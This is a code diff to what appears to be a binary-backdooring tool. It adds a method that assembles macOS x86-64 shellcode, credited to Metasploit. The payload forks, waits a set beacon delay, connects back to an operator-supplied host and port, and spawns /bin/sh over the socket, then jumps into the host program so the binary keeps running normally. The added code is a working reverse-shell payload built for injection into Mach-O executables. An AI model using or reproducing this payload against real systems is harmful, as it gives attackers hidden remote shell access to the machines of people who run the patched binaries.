@@ -58,6 +58,50 @@ class macho_intel64_shellcode():
     def returnshellcode(self):
         return self.shellcode
 
+    def delay_reverse_shell_tcp(self):
+        if self.PORT is None:
+            print ("Must provide port")
+            return False
+        if self.HOST is None:
+            print ("This payload requires a HOST parameter -H")
+            return False
+
+        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
+        self.shellcode2 = "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
+        self.shellcode2 += "\x48\x05"
+        self.shellcode2 += struct.pack("<I", self.BEACON)  # add rax, 15  for seconds
+        self.shellcode2 += ("\x48\x89\xC3"                  # mov rbx, rax
+                            "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
+                            "\x48\x39\xD8"                  # cmp rax, rbx
+                            "\x0F\x85\xf0\xff\xff\xff"      # jne back to system time
+                            )
+
+        self.shellcode2 += ("\xb8"
+                            "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
+                            "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
+                            "\x00\x02"
+                            )
+
+        self.shellcode2 += struct.pack(">H", self.PORT)
+        self.shellcode2 += self.pack_ip_addresses()
+        self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
+                            "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
+                            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02"
+                            "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
+                            "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"
+                            )
+
+        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
+        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
+        if self.jumpLocation < 0:
+            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
+        else:
+            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)
+
+        self.shellcode = self.shellcode1 + self.shellcode2
+
+        return (self.shellcode1 + self.shellcode2)
+
     def reverse_shell_tcp(self):
         if self.PORT is None:
             print ("Must provide port")
